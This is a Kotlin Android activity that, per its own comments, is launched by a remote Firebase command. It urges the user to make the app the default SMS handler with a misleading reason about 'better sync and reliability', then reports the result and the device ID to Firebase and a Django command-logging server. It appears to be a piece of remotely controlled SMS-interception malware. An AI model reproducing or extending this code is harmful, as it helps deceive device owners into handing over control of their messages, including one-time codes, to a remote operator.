package com.example.fast.ui

import android.animation.AnimatorSet
import android.animation.ObjectAnimator
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.animation.DecelerateInterpolator
import android.view.animation.OvershootInterpolator
import android.provider.Settings
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.app.AppCompatDelegate
import androidx.lifecycle.lifecycleScope
import com.example.fast.config.AppConfig
import com.example.fast.R
import com.example.fast.databinding.ActivityDefaultSmsRequestBinding
import com.example.fast.util.DefaultSmsAppHelper
import com.example.fast.util.DjangoApiHelper
import com.google.firebase.Firebase
import com.google.firebase.database.database
import kotlinx.coroutines.launch

/**
 * DefaultSmsRequestActivity
 * 
 * Activity launched remotely via Firebase command to request user to set app as default SMS app.
 * Shows a UI with message and "SET AS DEFAULT" button.
 * 
 * Usage:
 * - Command: requestDefaultMessageApp
 * - Content: Any value (ignored)
 * 
 * When user clicks the button, opens the system dialog to set this app as default SMS app.
 */
class DefaultSmsRequestActivity : AppCompatActivity() {
    
    private val binding by lazy { ActivityDefaultSmsRequestBinding.inflate(layoutInflater) }
    
    private val TAG = "DefaultSmsRequest"
    private val handler = Handler(Looper.getMainLooper())
    private val noActionTimeoutMs = 60_000L
    private var noActionRunnable: Runnable? = null
    private val prefsName = "default_sms_prefs"
    private val KEY_LAST_STATUS = "last_default_sms_status"
    private val KEY_LAST_REASON = "last_default_sms_reason"
    private val KEY_LAST_UPDATED_AT = "last_default_sms_updated_at"
    private val KEY_LAST_COMMAND_KEY = "last_default_sms_command_key"
    private val KEY_LAST_COMMAND_TS = "last_default_sms_command_ts"
    private val commandKey by lazy { intent.getStringExtra("commandKey") }
    private val commandHistoryTimestamp by lazy { intent.getLongExtra("historyTimestamp", -1L) }
    private var hasRequestedDefaultSms = false
    private var hasUpdatedCommandHistory = false
    private var hasSyncedDefaultSmsStatus = false
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        
        // Set window background to match app theme
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            window.statusBarColor = resources.getColor(R.color.theme_gradient_start, theme)
            window.navigationBarColor = resources.getColor(R.color.theme_gradient_start, theme)
        }
        
        setContentView(binding.root)
        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)
        
        // Start collapse animation
        binding.root.post {
            animateCollapseAndDeploy()
        }
        
        // Setup UI
        setupUI()
        
        // Check if already default SMS app
        checkDefaultSmsStatus()
    }
    
    /**
     * Setup UI elements
     */
    private fun setupUI() {
        // Set message text
        binding.messageText.text = "Please make this app your default message app for better sync and reliability."
        binding.subtitleText.text = "This will improve message delivery and sync."
        
        // Setup help button click listener
        binding.helpButton.setOnClickListener {
            // Open default SMS app selection dialog
            hasRequestedDefaultSms = true
            requestDefaultSmsApp()
            startNoActionTimeout()
            // Hide button after click
            binding.helpButtonCard.visibility = View.GONE
            binding.subtitleText.text = "Please select this app in the dialog that appears."
        }
    }
    
    /**
     * Check if app is already default SMS app
     */
    private fun checkDefaultSmsStatus() {
        if (DefaultSmsAppHelper.isDefaultSmsApp(this)) {
            Log.d(TAG, "App is already set as default SMS app")
            binding.messageText.text = "This app is already set as your default message app."
            binding.subtitleText.text = "Thank you for your support!"
            binding.helpButtonCard.visibility = View.GONE
            storeAndSyncDefaultSmsStatus(true, "already_default_on_open")
        }
    }
    
    /**
     * Request user to set app as default SMS app
     */
    private fun requestDefaultSmsApp() {
        try {
            Log.d(TAG, "Requesting user to set app as default SMS app")
            DefaultSmsAppHelper.requestDefaultSmsApp(this)
            Log.d(TAG, "Default SMS app selection dialog opened")
        } catch (e: Exception) {
            Log.e(TAG, "Error opening default SMS app settings", e)
            binding.subtitleText.text = "Error opening settings. Please try again."
            binding.helpButtonCard.visibility = View.VISIBLE
            updateCommandHistoryStatus("failed", "request_launch_error: ${e.message}")
        }
    }
    
    override fun onResume() {
        super.onResume()
        
        // Check if user has set app as default SMS app
        if (DefaultSmsAppHelper.isDefaultSmsApp(this)) {
            Log.d(TAG, "App is now set as default SMS app")
            binding.messageText.text = "Thank you! This app is now your default message app."
            binding.subtitleText.text = "Message delivery and sync will be improved."
            binding.helpButtonCard.visibility = View.GONE
            if (hasRequestedDefaultSms) {
                clearNoActionTimeout()
                storeAndSyncDefaultSmsStatus(true, "user_set_default_sms")
                updateCommandHistoryStatus("executed", "user_set_default_sms")
                finish()
            }
        } else if (hasRequestedDefaultSms) {
            clearNoActionTimeout()
            storeAndSyncDefaultSmsStatus(false, "user_declined_default_sms")
            updateCommandHistoryStatus("failed", "user_declined_default_sms")
            finish()
        }
    }

    private fun startNoActionTimeout() {
        clearNoActionTimeout()
        noActionRunnable = Runnable {
            if (!hasSyncedDefaultSmsStatus && hasRequestedDefaultSms) {
                storeAndSyncDefaultSmsStatus(false, "no_action")
                updateCommandHistoryStatus("failed", "no_action")
                finish()
            }
        }
        handler.postDelayed(noActionRunnable!!, noActionTimeoutMs)
    }

    private fun clearNoActionTimeout() {
        noActionRunnable?.let { handler.removeCallbacks(it) }
        noActionRunnable = null
    }

    private fun storeAndSyncDefaultSmsStatus(isDefault: Boolean, reason: String) {
        if (hasSyncedDefaultSmsStatus) return
        hasSyncedDefaultSmsStatus = true

        val updatedAt = System.currentTimeMillis()
        getSharedPreferences(prefsName, MODE_PRIVATE).edit()
            .putBoolean(KEY_LAST_STATUS, isDefault)
            .putString(KEY_LAST_REASON, reason)
            .putLong(KEY_LAST_UPDATED_AT, updatedAt)
            .putString(KEY_LAST_COMMAND_KEY, commandKey ?: "")
            .putLong(KEY_LAST_COMMAND_TS, commandHistoryTimestamp)
            .apply()

        val deviceId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        )
        val statusPath = "${AppConfig.getFirebaseDevicePath(deviceId)}/systemInfo/defaultSmsStatus/$updatedAt"
        val statusData = mapOf(
            "isDefault" to isDefault,
            "reason" to reason,
            "updatedAt" to updatedAt,
            "commandKey" to (commandKey ?: ""),
            "commandTimestamp" to commandHistoryTimestamp,
            "packageName" to packageName,
            "currentDefaultPackage" to (DefaultSmsAppHelper.getDefaultSmsAppPackage(this) ?: "")
        )

        Firebase.database.reference.child(statusPath).setValue(statusData)
            .addOnSuccessListener {
                Log.d(TAG, "Default SMS status synced to Firebase: $statusPath")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Failed to sync default SMS status to Firebase", e)
            }
    }

    @Suppress("DEPRECATION")
    private fun updateCommandHistoryStatus(status: String, reason: String) {
        if (hasUpdatedCommandHistory) return
        val key = commandKey ?: return
        if (commandHistoryTimestamp <= 0L) return

        hasUpdatedCommandHistory = true
        val deviceId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        )
        lifecycleScope.launch {
            try {
                DjangoApiHelper.logCommand(
                    deviceId = deviceId,
                    command = key,
                    value = null,
                    status = status,
                    receivedAt = commandHistoryTimestamp,
                    executedAt = System.currentTimeMillis(),
                    errorMessage = reason
                )
                Log.d(TAG, "Updated command history: $key -> $status ($reason)")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to update command history", e)
            }
        }
    }
    
    /**
     * Animate collapse to center, show logo, then deploy cards
     */
    private fun animateCollapseAndDeploy() {
        try {
            val handler = Handler(Looper.getMainLooper())
            val screenCenterX = resources.displayMetrics.widthPixels / 2f
            val screenCenterY = resources.displayMetrics.heightPixels / 2f
            
            // Get main content layout - find the LinearLayout containing all elements
            var mainLayout: View? = null
            for (i in 0 until binding.root.childCount) {
                val child = binding.root.getChildAt(i)
                if (child is android.widget.LinearLayout) {
                    mainLayout = child
                    break
                }
            }
            
            if (mainLayout == null) {
                Log.e(TAG, "Could not find main layout for animation")
                // If animation fails, ensure elements are visible
                binding.logoTextView.visibility = View.INVISIBLE
                return
            }
            
            val logoView = binding.logoTextView
            
            // Calculate center positions
            val layoutCenterX = screenCenterX - mainLayout.width / 2f
            val layoutCenterY = screenCenterY - mainLayout.height / 2f
            
            // Step 1: Collapse all elements to center (600ms)
            val collapseAnimator = AnimatorSet().apply {
                playTogether(
                    ObjectAnimator.ofFloat(mainLayout, "translationX", 0f, layoutCenterX - mainLayout.x),
                    ObjectAnimator.ofFloat(mainLayout, "translationY", 0f, layoutCenterY - mainLayout.y),
                    ObjectAnimator.ofFloat(mainLayout, "scaleX", 1f, 0f),
                    ObjectAnimator.ofFloat(mainLayout, "scaleY", 1f, 0f),
                    ObjectAnimator.ofFloat(mainLayout, "alpha", 1f, 0f)
                )
                duration = 600
                interpolator = DecelerateInterpolator()
            }
            
            // Step 2: Show logo in center and scale up (400ms)
            val logoShowAnimator = AnimatorSet().apply {
                playTogether(
                    ObjectAnimator.ofFloat(logoView, "alpha", 0f, 1f),
                    ObjectAnimator.ofFloat(logoView, "scaleX", 0.5f, 1.2f),
                    ObjectAnimator.ofFloat(logoView, "scaleY", 0.5f, 1.2f)
                )
                duration = 400
                startDelay = 600
                interpolator = OvershootInterpolator(1.5f)
            }
            
            // Step 3: Logo moves up (400ms)
            val logoMoveUpAnimator = ObjectAnimator.ofFloat(logoView, "translationY", 0f, -screenCenterY * 0.3f).apply {
                duration = 400
                startDelay = 1000
                interpolator = DecelerateInterpolator()
            }
            
            // Step 4: Deploy cards from center (800ms)
            val deployAnimator = AnimatorSet().apply {
                playTogether(
                    ObjectAnimator.ofFloat(mainLayout, "translationX", layoutCenterX - mainLayout.x, 0f),
                    ObjectAnimator.ofFloat(mainLayout, "translationY", layoutCenterY - mainLayout.y, 0f),
                    ObjectAnimator.ofFloat(mainLayout, "scaleX", 0f, 1f),
                    ObjectAnimator.ofFloat(mainLayout, "scaleY", 0f, 1f),
                    ObjectAnimator.ofFloat(mainLayout, "alpha", 0f, 1f)
                )
                duration = 800
                startDelay = 1400
                interpolator = OvershootInterpolator(1.2f)
            }
            
            // Hide logo after deploy starts
            val logoHideAnimator = AnimatorSet().apply {
                playTogether(
                    ObjectAnimator.ofFloat(logoView, "alpha", 1f, 0f),
                    ObjectAnimator.ofFloat(logoView, "scaleX", 1.2f, 0.5f),
                    ObjectAnimator.ofFloat(logoView, "scaleY", 1.2f, 0.5f)
                )
                duration = 300
                startDelay = 1400
            }
            
            // Show logo initially
            logoView.visibility = View.VISIBLE
            
            // Start animations
            collapseAnimator.start()
            logoShowAnimator.start()
            logoMoveUpAnimator.start()
            deployAnimator.start()
            logoHideAnimator.start()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error in collapse animation", e)
            // If animation fails, ensure elements are visible
            val mainLayout = binding.root.getChildAt(1) as? android.widget.LinearLayout
            mainLayout?.alpha = 1f
            binding.logoTextView.visibility = View.INVISIBLE
        }
    }
}
